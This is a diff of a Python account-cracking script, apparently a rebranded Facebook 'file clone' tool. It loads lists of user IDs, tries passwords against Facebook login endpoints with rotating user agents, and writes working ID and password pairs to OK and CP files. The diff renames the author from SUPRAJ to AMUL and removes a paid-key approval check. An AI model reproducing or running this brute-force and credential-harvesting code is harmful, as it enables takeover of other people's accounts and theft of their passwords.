@@ -82,9 +82,9 @@ def uaku():
 		ua=open('user-agents.txt','r').read().splitlines()
 
 
-print("\033[1;37m [\u001b[36m•\033[1;37m] CHECKING FOR UPDATES...... \033[1;37m")
+print("\033[1;37m [\u001b[36m•\033[1;37m] CHECKING FOR UPDATES \033[1;37m")
 time.sleep(2)
-get_ua_list = requests.get(" https://github.com/Said-Ait-Driss/latest-agents.git").text.splitlines()
+get_ua_list = requests.get(". ").text.splitlines()
 ugen2=[]
 ugen=[]
 cokbrut=[]
@@ -445,75 +445,18 @@ def linex():
 def animation(u):
     for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 logo ="""
- \033[1;91m_____ _____  _____ ____ 
- \033[1;92m|_   _/ _ \ \/ |_ _/ ___|
- \033[1;93m  | || | | \  / | | |    
- \033[1;94m  | || |_| /  \ | | |___ 
- \033[1;95m  |_| \___/_/\_|___\____|VERSION:\u001b[36m V7\033[1;37m
- ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
- ┃ [+] AUTHOR    \033[1;91m: \033[1;92mSUPRAJ                            ┃
- ┃ [+] TOOL      \033[1;91m: \033[1;92mFILE CLONE                        ┃
- ┃ [+] STATUS    \033[1;91m: \033[1;92mPAID                              ┃
- ┃ [+] SYSTEM    \033[1;91m: \033[1;92mDATA[BEST] & WIFI\u001b[36m V7\033[1;37m              ┃
- ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+\033[1;91m    ____  ___  ________  ______    _   __
+\033[1;92m   / __ )/   |/_  __/  |/  /   |  / | / /
+\033[1;93m  / __  / /| | / / / /|_/ / /| | /  |/ / 
+\033[1;94m / /_/ / ___ |/ / / /  / / ___ |/ /|  /  
+\033[1;95m/_____/_/  |_/_/ /_/  /_/_/  |_/_/ |_/ VERSION:\u001b[36m V7\033[1;37m
+ ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+ ┃ [+] AUTHOR    \033[1;91m: \033[1;92mSUGAR DADDY                ┃
+ ┃ [+] TOOL      \033[1;91m: \033[1;92mFILE CLONE                 ┃
+ ┃ [+] STATUS    \033[1;91m: \033[1;92mPAID                       ┃
+ ┃ [+] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI \u001b[36m V7\033[1;37m            ┃
+ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 -----------------------------------------------"""   
-#------------------[ APPROVAL SYSTEM ]-------------------#
-
-# Approval function
-def approval():
-    # Pull from Git repository
-    os.system('git pull')
-    time.sleep(1)
-
-    # Generate a unique ID
-    uuid = str(os.geteuid()) + "69" + str(os.geteuid())
-    id = "SUPRAJ-" + "".join(uuid)
-
-    # Clear the screen and display banner and info
-    clear()
-    info()
-
-    # Display message about the paid tool and print the generated ID
-    animation("\033[1;37m [\u001b[36m•\033[1;37m] This Is a Paid Tool. You Need Approval To Use This Tool \033[1;37m")
-    print("\033[1;37m [\u001b[36m•\033[1;37m] Your Key: \u001b[36m" + id)
-    time.sleep(0.1)
-    print("\033[1;37m--------------------------------------------------")
-
-    try:
-        # Fetch data from the URL containing approval keys
-        httpCaht = requests.get("https://github.com/SUPRAJ-8/APPROVALXTOXIC/blob/main/APPROVAL.txt").text
-        
-        # Check if the generated ID is approved
-        if id in httpCaht:
-            animation(">> Your Key Has Been Approved !!!")
-            msg = str(os.geteuid())
-            time.sleep(1)
-        else:
-            animation(">> Sorry, Your Key Has Not Been Approved ")
-            time.sleep(0.1)
-            input(' >> Click Enter And Send Your Key To Author')
-            os.system('xdg-open https://www.facebook.com/profile.php?id=100042145964429&mibextid=LQQJ4d')
-            time.sleep(1)
-            exit()
-    except Exception as e:
-        # Handle error if fetching data fails
-        animation(" >> Error: {}".format(e))
-        time.sleep(2)
-        exit()
-
-# Define info function
-def info():
-    # Your info code here
-    pass
-
-# Define animation function
-def animation(msg):
-    # Your animation code here
-    print(msg)
-
-# Call the approval function
-approval()
-
 #------------------[ MENU ]----------------#
  #===©===#
 class jalan:
@@ -536,10 +479,10 @@ def menu():
         login()
         dump_massal()
     elif HEART in ['1']:
-        crackfile()
+        crack_file()
     elif HEART in ['2','02']:
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100042145964429&mibextid=LQQJ4d')
-        os.system("python TOXIC.py")
+        os.system('xdg-open https://www.facebook.com/AMULxx')
+        os.system("python AMUL.py")
     elif HEART in ['0']:
         os.system('rm -rf .token.txt')
         os.system('rm -rf .cookie.txt')
@@ -553,33 +496,22 @@ def menu():
  
  
 #-------------[ CRACK-FROM-FILE ]------------------#
-import time
-
-def crackfile():
-    while True:
+ 
+def crack_file():
+    print('\033[0;97m-----------------------------------------------')
+    o = input(' [\u001b[36m•\033[1;37m] FILE NAME : ')
+    try:lin = open(o).read().splitlines()
+    except:
         print('\033[0;97m-----------------------------------------------')
-        print(' [\u001b[36m•\033[1;37m] Input File Name Without /sdcard/ ')
-        filename = input(' [\u001b[36m•\033[1;37m] Enter The Name Of File : ')
-        o = '/sdcard/'+filename # Form the complete file path
-        try:
-            with open(o) as file:
-                lines = file.read().splitlines()
-            break  # Exit the loop if the file is successfully opened
-        except FileNotFoundError:
-            print('\033[0;97m-----------------------------------------------')
-            print(' [×] FILE NOT FOUND')
-            input(" Please Press Enter to retry...")
-    
-    # Assuming `id` is defined elsewhere in your code
-    for xid in lines:
+        animation(' [×] FILE NOT FOUND')
+        time.sleep(2)
+        back()
+    for xid in lin:
         id.append(xid)
-
-        setting()
-
-
+    setting()
+ 
 #-------------[ PENGATURAN-IDZ ]---------------#
  
-
 def setting():
     print('\033[0;97m-----------------------------------------------')
     print(" [\u001b[36m1\033[1;37m] ONLY OLD IDZ")
@@ -696,8 +628,12 @@ def passwrd():
     woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
     os.system("python AMUL.py")
     exit() 
-
 #--------------------[ METODE-B-API ]-----------------#
+ 
+import sys
+import random
+import requests
+import re
 
 def crack(idf,pwv):
     global loop, ok, cp
@@ -785,14 +721,12 @@ def crack(idf,pwv):
             waktu(31)
     
     loop += 1
-
-
-
+ 
 #------------------[ METHODE-MBASIC-2 ]-------------------#
-
+ 
 def crackfree(idf,pwv):
     global loop,ok,cp
-    sys.stdout.write(f"\r {P}[SUPRAJ-XD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.write(f"\r {P}[AMUL-XD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -812,7 +746,7 @@ def crackfree(idf,pwv):
             
                 print(f'\r{P}{K} [{time.strftime("%H:%M")}-CP] {idf} │ {pw} {P}')
                 cek_apk(session,coki)
-                open('/sdcard/SUPRAJ-CP.txt', 'a').write(idf+' • '+pw+'\n')
+                open('/sdcard/AMUL-CP.txt', 'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
                 break
@@ -821,7 +755,7 @@ def crackfree(idf,pwv):
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
-                open('/sdcard/SUPRAJ-OK.txt', 'a').write(idf+' • '+pw+'\n')
+                open('/sdcard/AMUL-OK.txt', 'a').write(idf+' • '+pw+'\n')
                 break
                 
             else:
@@ -855,7 +789,6 @@ def cek_apk(session,coki):
             print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
         else:
             print(f'\r')
-
 #-----------------------[ SYSTEM-CONTROL ]--------------------#
  
 if __name__=='__main__':
